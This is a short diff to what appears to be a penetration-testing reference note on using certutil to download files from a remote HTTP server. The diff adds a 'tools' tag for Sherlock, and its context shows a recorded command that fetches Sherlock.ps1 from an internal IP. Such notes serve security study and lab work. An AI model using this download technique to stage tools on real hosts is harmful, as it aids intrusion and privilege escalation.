@@ -9,6 +9,8 @@ output: "C:\\>certutil.exe -urlcache -split -f \"http://10.10.10.100/Sherlock.ps
   CertUtil: -URLCache command completed successfully."
 created_at: '2019-11-25T22:00:53.902277+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
+tools:
+- '[[Sherlock]]'
 ---
 
 # Download from a Remote HTTP Server (certutil)
